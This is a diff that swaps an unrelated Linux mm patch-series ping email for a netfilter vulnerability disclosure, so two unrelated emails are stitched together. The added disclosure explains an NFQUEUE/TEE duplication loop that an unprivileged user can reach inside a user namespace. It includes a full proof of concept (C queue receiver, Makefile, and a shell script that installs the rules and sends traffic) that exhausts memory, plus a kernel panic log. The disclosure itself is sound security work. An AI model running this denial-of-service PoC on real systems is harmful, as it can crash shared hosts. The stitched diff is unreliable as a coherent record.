@@ -1,113 +1,504 @@
-Received: from out30-130.freemail.mail.aliyun.com (out30-130.freemail.mail.aliyun.com [115.124.30.130])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pj2-f42.google.com (mail-pj2-f42.google.com [74.125.227.170])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3FD3743E08F;
-	Tue, 22 Sep 2026 09:52:31 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=115.124.30.130
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8E10B41685B
+	for <linux-kernel@vger.kernel.org>; Tue, 22 Sep 2026 09:52:41 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.170
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1790070755; cv=none; b=i4r6T4MA1guxjGkG/bAOlg97UB3/SEVWJD9UI04VvA/lOWfZYqGrHxfvkQFox/d0HsBws9/XWqLXFLz4DQe2v+mZXM9A3r7J6egbLI2NZ3wTqxSHG5dAgu1tT+OATLbH4DPMqh2fyjSC16B5chBZPzBbuyqWyS5GJUIYKPJgnDE=
+	t=1790070763; cv=none; b=n8keTx8nut1Tz2EAmQrK5U6L+6R/PdsxAZnEYLwV83VQNo6kl0wRa4cvsVqiJjZNox/+WiiCJyW5UMVuRMf6uqZAMSnLnmh+6IxDT85vjqN3yRMmtzwRv3Qp5hpN3G/BGis+PGlgDQww0gcriVqkpJjIYNpjtek/eyRR5I8hhHA=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1790070755; c=relaxed/simple;
-	bh=IOLIY/iVTnmqBFIGzbrUeePIfRsgjk3jUrVJ442QJzI=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=IQMJKarbJ/82xoqfmKYLc6XazgsG4gI7o4CRAUQQ7MuOmgOGp6JwvcXvZ4dvJVukqya+UgO0Tic6EV2auqNGIBs8N+fnnB/Hslw+KONfZVHRQVbFGx1i+2hPphb8Dw0arJZZe6McWJD3qoeAhcX0E9ePC/W+HVYe0qt7jkrjiW4=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.alibaba.com; spf=pass smtp.mailfrom=linux.alibaba.com; dkim=pass (1024-bit key) header.d=linux.alibaba.com header.i=@linux.alibaba.com header.b=qPGC01KS; arc=none smtp.client-ip=115.124.30.130
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.alibaba.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.alibaba.com
+	s=arc-20240116; t=1790070763; c=relaxed/simple;
+	bh=1TPEzwENrPN13xw6H6jIwlm4wNTqi6v/8MaCRk0Kg5A=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=qiixdjBtnR+Q/yrT7pYfdwspbIW1vdDIauhnptKe34toVWFE6MR2e+1oCXQgT/gotJj4hw7thk9x/nVbBCaNxKCUKSBFG0yT3eS4PBeJTsAj/0n+zFDHeFdPvZh4Yc5x+oaN+BNVen+od7YRGsyUfnSJBR2UjCHjhgaKSOKyYp0=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=UWqtEGIH; arc=none smtp.client-ip=74.125.227.170
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linux.alibaba.com header.i=@linux.alibaba.com header.b="qPGC01KS"
-DKIM-Signature:v=1; a=rsa-sha256; c=relaxed/relaxed;
-	d=linux.alibaba.com; s=default;
-	t=1790070744; h=Message-ID:Date:MIME-Version:Subject:To:From:Content-Type;
-	bh=uLXPio8neK/XWQ24/aYWgPbiu1ZOhj0GPf/ayqaAKLs=;
-	b=qPGC01KSGvPEAo/piyIMeU0NmSz6Rzl1q0/KISqF4hJCDdaH3BAXjxbp7Zda098HpEk1B31uyNODYY7x8wXzS/BJ2I+KX1aybeqmVwkze68ReIvsFC3Gum1ErvFgtQgm4pGdmMnUoBqd+p/NVxgE50y2YeILOi0h/jJt/lZIgAc=
-X-Alimail-AntiSpam:AC=PASS;BC=-1|-1;BR=01201311R381e4;CH=green;DM=||false|;DS=||;FP=0|-1|-1|-1|0|-1|-1|-1;HT=maildocker-contentspam033037026112;MF=qinyuntan@linux.alibaba.com;NM=1;PH=DS;RN=20;SR=0;TI=SMTPD_---0XBTMM3c_1790070738;
-Received: from 30.178.68.4(mailfrom:qinyuntan@linux.alibaba.com fp:SMTPD_---0XBTMM3c_1790070738 cluster:ay36)
-          by smtp.aliyun-inc.com;
-          Tue, 22 Sep 2026 17:52:22 +0800
-Message-ID: <db317551-0b1e-40f8-b265-d00d65653089@linux.alibaba.com>
-Date: Tue, 22 Sep 2026 17:52:17 +0800
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="UWqtEGIH"
+Received: by mail-pj2-f42.google.com with SMTP id 98e67ed59e1d1-396ccb1a990so3589881a91.3
+        for <linux-kernel@vger.kernel.org>; Tue, 22 Sep 2026 02:52:41 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1790070761; x=1790675561; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=uQpCosv4pEll0NY5gMGAB4Bm0vfvZxCTFxe/N0RKf9g=;
+        b=UWqtEGIHCWRnDSrpqwIIpPFoiQ7XWlDPpby2LXk+SHXQoj+5R4t/H53H319r/JjMa3
+         8vOtJEcCs1idyvwjPrVYk/2cfr6cqHhNro1s62zpiQmLDw4yVY3jiN2zD9oDausez4t6
+         Nsby3/y58lxT8qV9NnjRX7dn2wMhsonPOfoIWEFYrwDTVO18CuIKJ+qVsH98/CI9/wP5
+         vJUCR3/0mTUr2ZhQ8xf2APp66bSCnQZkep3zly6BY5qP9Y+Db/htOflqcq3GIOwHQemq
+         an1JdHPDHx2uy1cgrEtUSUlsB+88VhzcWHXVMARd73Cevy/aNGrIjJk50Jg3ydXZylZI
+         uZKQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1790070761; x=1790675561;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=uQpCosv4pEll0NY5gMGAB4Bm0vfvZxCTFxe/N0RKf9g=;
+        b=nKl/h6EFzvjwmo7n25kfTZqQonk1VF1lAsRqUSf5KDkaPfpseDLxp99rnWtqFSPDK1
+         /Kukuquc10dyLoV82O1MZdbdux6aAtXBnfYTDa7cv9Q0LgSRyglzTcUlYedXyQCYEX4+
+         2Og3DF3va2SDXWvjy84duFNHwyZOjHse0AFdiSni9DxBt1Br2tIS2xv9HIYDg7saVI39
+         OEXWQaWlpYCuj2kA+yaNDl42LWtoTopKHY7a0h+4t+PkYqHnh47c6dkmja3eK6xYtQBQ
+         JYoK8AArYEirAl3VQxD0J+RsHuzT2aTdChQ3bJC0FbaQ2/0dVnbGPQKaThkrvHBvmnrj
+         0mJA==
+X-Forwarded-Encrypted: i=1; AKwUvBwXtTPszFeMp2/4TU/awz/i5lTICc1LasLENIcwYzI7Mwt21gJf/N0dtrcl+LkTP73M1FgRkQP4pAWncsY=@vger.kernel.org
+X-Gm-Message-State: AFuF++nqn+d6/wqCA1qFESez5nKMt93o28fhVf193/4yjmmyqptU2Ffn
+	szrQU5NMgy6O/NUyLx5SFAY6wt8VP6LfmW1sh1W2QEhOkzRDmOBuPz9A3xhv57EsgRLa
+X-Gm-Gg: AYBFou3Ic9GpqKGEibGdJBWGDQ7e7aIRF+pfreWBqzy8wmsiVSgsTa2bELy/l+5Qdq+
+	ZtcC3UdyST2ySXd9K+WCpe7qyttU+KWBC8Cb+WctNP2ae+71fMmiCfr0txxSD6TzLOQO1ctG17S
+	s+158sDFJldFcF9brK/W3OTBUSIh1659JadbsjqrG02HT1Fk1xAAyZgx//ftuI+PmXZPuKv1fPT
+	2xtSUMsTCM3NyEVRp6ya7l8snMzAUNaUFIQEbBPdfuv6g5WpCwNlZLX26CNYwGn3pgTjTf5fmhb
+	sEeeSqoMSndR5KIjoSkagl2X8y2hpuO4RZHaskjwyjQF/OrGyoXDaKczZKU7w0w/pVfnvzmayOc
+	Yvqq9LoeG7T9ZJBByKZ8kSpP2hpm5EPgz9UJmUL4i59cnoTTKe1r7pvsW5BVSLWOg3auC0RN2xA
+	h68sV505NW59R2BCaHWQsIkG2Kwq/udcM5KTFeZQfP4UlKNXuzN3qohxElyeUUxP/al9RgHZ5vR
+	+Fq0mxh2l+wy3DWc9B6B9sXhiDkAUBEyMzF5IBa
+X-Received: by 2002:a17:90b:384f:b0:39d:cbb1:c96f with SMTP id 98e67ed59e1d1-3a0730c847fmr693719a91.18.1790070760542;
+        Tue, 22 Sep 2026 02:52:40 -0700 (PDT)
+Received: from 954df21a5119.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a06dfd6705sm2679525a91.0.2026.09.22.02.52.36
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Tue, 22 Sep 2026 02:52:39 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netfilter-devel@vger.kernel.org
+Cc: zihanx@nebusec.ai,
+	pablo@netfilter.org,
+	fw@strlen.de,
+	phil@nwl.cc,
+	davem@davemloft.net,
+	edumazet@google.com,
+	kuba@kernel.org,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	coreteam@netfilter.org,
+	netdev@vger.kernel.org,
+	linux-kernel@vger.kernel.org
+Subject: [PATCH nf v3 0/1] netfilter: nf_dup: disable duplication in user namespaces
+Date: Tue, 22 Sep 2026 09:52:30 +0000
+Message-ID: <cover.1790042930.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH v3 0/4] mm: restore per-memcg reclaim for NONSLAB
- shrinkers under nokmem
-To: Andrew Morton <akpm@linux-foundation.org>
-Cc: Johannes Weiner <hannes@cmpxchg.org>, Michal Hocko <mhocko@kernel.org>,
- Roman Gushchin <roman.gushchin@linux.dev>,
- Shakeel Butt <shakeel.butt@linux.dev>, Muchun Song <muchun.song@linux.dev>,
- =?UTF-8?Q?Michal_Koutn=C3=BD?= <mkoutny@suse.com>,
- David Hildenbrand <david@kernel.org>, Zi Yan <ziy@nvidia.com>,
- Baolin Wang <baolin.wang@linux.alibaba.com>,
- Usama Arif <usama.arif@linux.dev>, Dave Chinner <david@fromorbit.com>,
- Qi Zheng <qi.zheng@linux.dev>, Yosry Ahmed <yosry@kernel.org>,
- Nhat Pham <nphamcs@gmail.com>, Chengming Zhou <chengming.zhou@linux.dev>,
- Xunlei Pang <xlpang@linux.alibaba.com>, cgroups@vger.kernel.org,
- linux-mm@kvack.org, linux-kernel@vger.kernel.org
-References: <20260910080722.3961351-1-qinyuntan@linux.alibaba.com>
- <20260910153418.e818710d3c35aa075f1156ab@linux-foundation.org>
-From: Qinyun Tan <qinyuntan@linux.alibaba.com>
-In-Reply-To: <20260910153418.e818710d3c35aa075f1156ab@linux-foundation.org>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
 
+Hi Linux kernel maintainers,
 
+We found and validated a issue in net/ipv6/netfilter/nf_dup_ipv6.c.
+The bug is reachable by a non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-On 9/11/26 6:34 AM, Andrew Morton wrote:
-> On Thu, 10 Sep 2026 16:07:18 +0800 Qinyun Tan <qinyuntan@linux.alibaba.com> wrote:
-> 
->> With cgroup.memory=nokmem, the THP deferred split shrinker and the
->> zswap shrinker are degraded in two ways.
->>
->> First, both shrinkers are missing the SHRINKER_NONSLAB flag, so
->> shrinker_memcg_alloc() demotes them to non-memcg-aware shrinkers:
->> limit-induced reclaim of a cgroup neither splits its partially
->> unmapped THPs nor writes back its zswapped pages.  v1 of this series
->> [1] restored the flag to fix that.
->>
->> However, as Sashiko's review of v1 pointed out [2], the flag alone
->> is not enough.  __list_lru_init() also collapses every list_lru into
->> per-node lists under nokmem, so even with the flag restored, the
->> objects of all cgroups share one list per node: the per-memcg
->> shrinker bit is only set for whichever memcg happens to repopulate
->> the empty list, so pressure in other cgroups may not even trigger
->> the scan, and when it does, the scan walks everyone's objects.
->>
->> Before commit fafaeceb89a5 ("mm: switch deferred split shrinker to
->> list_lru"), THP had fully per-memcg deferred split queues embedded
->> in struct mem_cgroup, working independently of kmem accounting.
->> nokmem only opts out of kernel slab accounting; THPs and zswapped
->> pages are user memory and remain charged to their cgroups, so
->> per-memcg reclaim is still what these shrinkers want.
->>
->> This series keeps list_lrus backed by SHRINKER_NONSLAB shrinkers
->> memcg aware under nokmem:
-> 
-> Thanks.
-> 
-> It seems that Sashiko still doesn't understand that memory allocations
-> in __init code are considered "can't fail".
-> 
-> 	https://sashiko.dev/#/patchset/20260910080722.3961351-1-qinyuntan@linux.alibaba.com
-> 
-> otoh, failures in the functiond which hugepage_init() calls might be
-> caused by things other than ENOMEM so I guess we shouldn't zap all that
-> cleanup code.
-> 
-> Anyway, that's unrelated to your changes.
-> 
-> I'll save this patchset away for later and shall await reviewer input. 
-> Please poke me in a week or so if there hasn't been any, Things are
-> crazy lately.
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Hi Andrew,
- 
-Thanks for your time looking into this series. A gentle ping, as you
-suggested. Please let me know if anything else is needed from my side.
+changes in v3:
+  - rerolled the unchanged fix against the latest nf.git main after no
+    follow-up was received on v2
+  - add the required Co-developed-by trailer and matching Signed-off-by
+  - v2 Link: https://lore.kernel.org/all/cover.1788425393.git.zihanx@nebusec.ai/
+changes in v2:
+  - drop the persistent struct sk_buff::nf_duplicated field and nf_copy()
+    change from v1
+  - disable IPv4/IPv6 duplication in non-initial user namespaces
+  - v1 Link: https://lore.kernel.org/all/cover.1787903722.git.zihanx@nebusec.ai/
 
-Thanks,
-Qinyun Tan
+---- details below ----
+
+Bug details:
+
+nf_dup_ipv4() and nf_dup_ipv6() prevent recursive TEE targets and nftables
+dup expressions only with current->in_nf_duplicate. The flag covers the
+synchronous ip_local_out() or ip6_local_out() call, but it is cleared when
+the output function returns.
+
+An earlier NFQUEUE hook can retain the cloned skb while letting the output
+function return. A later NF_ACCEPT verdict resumes the same skb at the hook
+after the queueing rule, under the verdict task and after the task flag was
+cleared. A later TEE target or dup expression can therefore clone it again.
+An earlier queue hook and a later duplication hook form an unbounded packet
+generation loop. nf_dup_ipv4() and nf_dup_ipv6() are shared by IPv4/IPv6
+and by xtables TEE and nftables dup, so the same helper state exists on
+those frontends. The embedded PoC demonstrates the IPv6 ip6tables NFQUEUE
+and TEE path only.
+
+The patch skips IPv4 and IPv6 duplication when the network namespace is
+owned by a non-initial user namespace. There is no sensible use case for
+DUP there, and this avoids combining NFQUEUE with TEE or dup in that
+environment. The original packet still continues. The initial user
+namespace keeps the existing TEE/dup path, including the current
+in_nf_duplicate lifetime around ip_local_out()/ip6_local_out(). That
+residual is intentional: this series only disables duplication in
+network namespaces owned by a non-initial user namespace.
+
+On the unpatched nf.git baseline, one seed datagram in a child user and
+net namespace produced 1,368,004 NFQUEUE verdicts in 4.938 s. The same
+poc.sh --userns command on this patch queued a single packet
+(id_sequence=1). Guest-root TEE in the initial user namespace still
+produced 1,291,534 verdicts, so duplication remains available there.
+
+The root cause predates the later helper extraction and nftables caller.
+Commit cd58bcd9787e ("netfilter: xt_TEE: have cloned packet travel through
+Xtables too") changed TEE clones from direct ip_output()/ip6_output() to
+ip_local_out()/ip6_local_out() and introduced a transient tee_active guard.
+Its parent bypassed clone traversal through Xtables, so the current
+queue-after-guard-lifetime state did not exist there. Commit bbde9fc1824a
+factored the logic into nf_dup_ipv4()/nf_dup_ipv6(), commit d877f07112f1
+added nftables dup callers, and commit a1f1acb9c5db moved the same
+transient guard into task_struct. Those later commits preserved or
+widened the older root cause, so the Fixes tag points to cd58bcd9787e.
+
+The crash log below is not from the unprivileged user/net namespace run.
+It came from a separate unpatched root validation with panic_on_oom=1, so
+the log shows UID 0 and systemd-journal. The non-root userns path can
+install the same NFQUEUE and TEE rules and generate the packet loop, but
+vm.panic_on_oom is a host-wide setting and is not enabled by that child
+namespace. The log was decoded with decode_stacktrace.sh using the
+matching vmlinux, so source file and line information is included.
+
+Reproducer:
+
+    make
+    PANIC_ON_OOM=0 QUEUE_COUNT=1 TEE_CLONES=1 PAYLOAD=1 \
+        bash ./poc.sh --userns
+
+The complete multi-file reproducer uses libnetfilter_queue. The Makefile
+links the receiver with -lnetfilter_queue -lnfnetlink; poc.sh installs the
+NFQUEUE and TEE rules and sends the IPv6 UDP traffic. The two-line template
+shorthand below is receiver-only reference, not the complete trigger. It
+does not install rules or send traffic, and the standalone receiver also
+requires the two libraries above:
+
+    gcc -O2 -static -o poc poc.c
+    unshare -Urn ./poc
+
+The crash run was a guest-root execution without --userns:
+
+    PANIC_ON_OOM=1 bash ./poc.sh
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+The --userns comparison and the separate root crash run both used this
+environment. The crash log reports CPU: 1, consistent with the 2-vCPU
+guest.
+
+packetdrill was not used because the trigger requires a userspace
+libnetfilter_queue verdict service together with ip6tables NFQUEUE/TEE rule
+installation, which packetdrill cannot express by itself.
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <linux/netfilter.h>
+#include <linux/netlink.h>
+#include <signal.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <time.h>
+#include <unistd.h>
+
+#include <libnetfilter_queue/libnetfilter_queue.h>
+
+static volatile sig_atomic_t stop;
+static uint64_t packets_seen;
+static uint64_t last_report;
+static struct timespec start_ts;
+
+static void on_signal(int signo)
+{
+	(void)signo;
+	stop = 1;
+}
+
+static void report_progress(bool force)
+{
+	struct timespec now;
+	double seconds;
+
+	if (!force && packets_seen - last_report < 1000)
+		return;
+
+	if (clock_gettime(CLOCK_MONOTONIC, &now) != 0)
+		return;
+
+	seconds = (now.tv_sec - start_ts.tv_sec) +
+		  (now.tv_nsec - start_ts.tv_nsec) / 1000000000.0;
+	fprintf(stderr, "accepted=%llu elapsed=%.3f rate=%.0f pkt/s\n",
+		(unsigned long long)packets_seen, seconds,
+		seconds > 0.0 ? packets_seen / seconds : 0.0);
+	last_report = packets_seen;
+}
+
+static int queue_cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
+		    struct nfq_data *nfa, void *data)
+{
+	struct nfqnl_msg_packet_hdr *ph;
+	uint32_t id = 0;
+
+	(void)nfmsg;
+	(void)data;
+
+	ph = nfq_get_msg_packet_hdr(nfa);
+	if (ph)
+		id = ntohl(ph->packet_id);
+
+	packets_seen++;
+	report_progress(false);
+
+	return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+}
+
+int main(int argc, char **argv)
+{
+	struct nfq_handle *h = NULL;
+	struct nfq_q_handle *qh = NULL;
+	int fd;
+	int queue_num = 0;
+	int rv;
+	int ret = 1;
+	int one = 1;
+	int rcvbuf = 512 * 1024 * 1024;
+	unsigned int maxlen = 65535;
+	char buf[8192] __attribute__((aligned));
+
+	if (argc > 2) {
+		fprintf(stderr, "usage: %s [queue-num]\n", argv[0]);
+		return 2;
+	}
+	if (argc == 2)
+		queue_num = atoi(argv[1]);
+
+	signal(SIGINT, on_signal);
+	signal(SIGTERM, on_signal);
+
+	if (clock_gettime(CLOCK_MONOTONIC, &start_ts) != 0) {
+		perror("clock_gettime");
+		return 1;
+	}
+
+	h = nfq_open();
+	if (!h) {
+		perror("nfq_open");
+		goto out;
+	}
+
+	if (nfq_unbind_pf(h, AF_INET6) < 0)
+		fprintf(stderr, "warning: nfq_unbind_pf(AF_INET6) failed\n");
+
+	if (nfq_bind_pf(h, AF_INET6) < 0) {
+		perror("nfq_bind_pf(AF_INET6)");
+		goto out;
+	}
+
+	qh = nfq_create_queue(h, (uint16_t)queue_num, queue_cb, NULL);
+	if (!qh) {
+		perror("nfq_create_queue");
+		goto out;
+	}
+
+	if (nfq_set_mode(qh, NFQNL_COPY_META, 0) < 0) {
+		perror("nfq_set_mode");
+		goto out;
+	}
+
+	if (nfq_set_queue_maxlen(qh, maxlen) < 0)
+		fprintf(stderr, "warning: nfq_set_queue_maxlen(%u) failed\n", maxlen);
+
+	fd = nfq_fd(h);
+	if (setsockopt(fd, SOL_SOCKET, SO_RCVBUFFORCE, &rcvbuf,
+		       sizeof(rcvbuf)) < 0 &&
+	    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0)
+		fprintf(stderr, "warning: socket receive buffer setup failed: %s\n",
+			strerror(errno));
+	if (setsockopt(fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &one, sizeof(one)) < 0)
+		fprintf(stderr, "warning: NETLINK_NO_ENOBUFS failed: %s\n",
+			strerror(errno));
+
+	while (!stop) {
+		rv = recv(fd, buf, sizeof(buf), 0);
+		if (rv >= 0) {
+			if (nfq_handle_packet(h, buf, rv) < 0) {
+				perror("nfq_handle_packet");
+				break;
+			}
+			continue;
+		}
+
+		if (errno == EINTR)
+			continue;
+		if (errno == ENOBUFS)
+			continue;
+
+		perror("recv");
+		break;
+	}
+
+	report_progress(true);
+	ret = 0;
+
+out:
+	if (qh)
+		nfq_destroy_queue(qh);
+	if (h)
+		nfq_close(h);
+	return ret;
+}
+------END poc.c--------
+
+------BEGIN Makefile------
+CC ?= gcc
+CFLAGS ?= -O2 -Wall -Wextra
+LDLIBS ?= -lnetfilter_queue -lnfnetlink
+
+all: poc
+
+poc: poc.c
+
+clean:
+	rm -f poc
+------END Makefile--------
+
+------BEGIN poc.sh------
+#!/bin/bash
+set -euo pipefail
+
+SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
+IP=/usr/sbin/ip
+IP6TABLES=/usr/sbin/ip6tables-legacy
+SYSCTL=/usr/sbin/sysctl
+export XTABLES_LOCKFILE=${XTABLES_LOCKFILE:-$SCRIPT_DIR/xtables.lock}
+QUEUE_COUNT=${QUEUE_COUNT:-18}
+BASE_PORT=${BASE_PORT:-5555}
+PAYLOAD=${PAYLOAD:-60000}
+TEE_CLONES=${TEE_CLONES:-2}
+PANIC_ON_OOM=${PANIC_ON_OOM:-1}
+PANIC_ON_WARN=${PANIC_ON_WARN:-0}
+
+if [[ ${1-} == "--userns" ]]; then
+	exec unshare -Urn -- "$0" --inside-userns
+fi
+
+if [[ ${1-} == "--inside-userns" ]]; then
+	shift
+fi
+
+cleanup() {
+	"$IP6TABLES" -t raw -F OUTPUT 2>/dev/null || true
+	"$IP6TABLES" -t mangle -F OUTPUT 2>/dev/null || true
+	for pid in "${acceptor_pids[@]-}"; do
+		kill "$pid" 2>/dev/null || true
+	done
+	for pid in "${acceptor_pids[@]-}"; do
+		wait "$pid" 2>/dev/null || true
+	done
+}
+trap cleanup EXIT
+
+"$IP" link set lo up
+"$SYSCTL" -q -w kernel.panic_on_warn="$PANIC_ON_WARN" || true
+"$SYSCTL" -q -w vm.panic_on_oom="$PANIC_ON_OOM" || true
+"$SYSCTL" -q -w net.core.rmem_max=536870912 || true
+"$SYSCTL" -q -w net.core.rmem_default=536870912 || true
+"$SYSCTL" -q -w net.netfilter.nf_queue_maxlen=65535 || true
+
+make -C "$SCRIPT_DIR" clean all
+
+"$IP6TABLES" -t raw -F OUTPUT
+"$IP6TABLES" -t mangle -F OUTPUT
+
+acceptor_pids=()
+
+for q in $(seq 0 $((QUEUE_COUNT - 1))); do
+	port=$((BASE_PORT + q))
+
+	"$IP6TABLES" -t raw -A OUTPUT \
+		-p udp -d ::1 --dport "$port" \
+		-j NFQUEUE --queue-num "$q"
+
+	for _ in $(seq 1 "$TEE_CLONES"); do
+		"$IP6TABLES" -t mangle -A OUTPUT \
+			-p udp -d ::1 --dport "$port" \
+			-j TEE --gateway ::1 --oif lo
+	done
+
+	"$SCRIPT_DIR/poc" "$q" >"$SCRIPT_DIR/acceptor-$q.log" 2>&1 &
+	acceptor_pids+=("$!")
+done
+sleep 1
+
+python3 - "$BASE_PORT" "$QUEUE_COUNT" "$PAYLOAD" <<'PY'
+import socket
+import sys
+
+base_port = int(sys.argv[1])
+queue_count = int(sys.argv[2])
+payload_len = int(sys.argv[3])
+
+s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
+for offset in range(queue_count):
+	dport = base_port + offset
+	s.sendto(b"A" * payload_len, ("::1", dport))
+	print("sent", payload_len, "bytes to ::1", dport)
+PY
+
+echo "PoC is active. Queue state:"
+cat /proc/net/netfilter/nfnetlink_queue 2>/dev/null || true
+
+wait
+------END poc.sh--------
+
+----BEGIN crash log----
+[   41.727564] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
+[   41.749001] CPU: 1 UID: 0 PID: 91 Comm: systemd-journal Not tainted 7.2.0-07242-g7cbfb180945c #1 PREEMPT(lazy) 
+[   41.774942] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[   41.804442] Call Trace:
+[   41.810996]  <TASK>
+[   41.817782]  vpanic (kernel/panic.c:651)
+[   41.827657]  panic (kernel/panic.c:788)
+[   41.837426]  out_of_memory (mm/oom_kill.c:1076 (discriminator 4) mm/oom_kill.c:1143 (discriminator 4))
+[   41.849070]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4116 mm/page_alloc.c:4967 mm/page_alloc.c:5317)
+[   41.864629]  ? blk_finish_plug (block/blk-core.c:1293)
+[   41.878318]  alloc_pages_mpol (mm/mempolicy.c:2490)
+[   41.893205]  folio_alloc_noprof (mm/mempolicy.c:2561 (discriminator 1) mm/mempolicy.c:2581 (discriminator 1) mm/mempolicy.c:2591 (discriminator 1))
+[   41.907427]  __filemap_get_folio_mpol (mm/filemap.c:2018 (discriminator 2))
+[   41.925721]  filemap_fault (include/linux/pagemap.h:761 mm/filemap.c:3598)
+[   41.938653]  __do_fault (mm/memory.c:5425)
+[   41.950917]  __handle_mm_fault (mm/memory.c:5860 mm/memory.c:5994 mm/memory.c:4566 mm/memory.c:6379 mm/memory.c:6517)
+[   41.966132]  handle_mm_fault (mm/memory.c:6686)
+[   41.980871]  do_user_addr_fault (arch/x86/mm/fault.c:1343)
+[   41.993516]  exc_page_fault (arch/x86/mm/fault.c:1483 arch/x86/mm/fault.c:1536)
+[   42.007098]  asm_exc_page_fault (arch/x86/include/asm/idtentry.h:595)
+[   42.020389] RIP: 0033:0x7f85625ebff9
+[   42.034319] Code: Unable to access opcode bytes at 0x7f85625ebfcf.
+
+Code starting with the faulting instruction
+===========================================
+[   42.054294] RSP: 002b:00007ffc20d6b660 EFLAGS: 00010202
+[   42.072734] RAX: 0000000000000001 RBX: 000055b7f426f600 RCX: 00007f8562328df6
+[   42.090030] RDX: 0000000000000013 RSI: 000055b7f4277030 RDI: 0000000000000000
+[   42.108167] RBP: ffffffffffffffff R08: 0000000000000000 R09: 00007f85626c8000
+[   42.131161] R10: 00000000ffffffff R11: 0000000000000000 R12: 0000000000000001
+[   42.153849] R13: 0000000000000013 R14: 0000000000000000 R15: 0000000000000000
+[   42.180119]  </TASK>
+[   42.188961] Kernel Offset: 0x24000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+[   42.228760] ---[ end Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled ]---
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (1):
+  netfilter: nf_dup: disable duplication in user namespaces
+
+ net/ipv4/netfilter/nf_dup_ipv4.c | 3 +++
+ net/ipv6/netfilter/nf_dup_ipv6.c | 3 +++
+ 2 files changed, 6 insertions(+)
+
+-- 
+2.43.0
+
